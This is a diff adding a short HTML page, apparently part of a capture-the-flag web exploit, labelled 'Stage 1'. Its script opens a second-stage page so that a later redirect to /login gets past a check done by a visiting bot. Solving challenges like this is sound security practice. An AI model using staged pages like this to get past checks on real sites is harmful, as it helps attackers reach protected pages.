@@ -1,0 +1,16 @@
+<html>
+    <head>Stage 1 of the Exploit</head>
+    <body>
+        <p>
+            The only thing that this exploit does is to open the second stage.
+        </p>
+        <br/>
+        <p>
+            We need a dedicated page in order to redirect this page to /login, to bypass
+            the check performed by the bot.
+        </p>
+    </body>
+    <script>
+        var tab = open("/stage-two","_blank")
+    </script>
+</html>
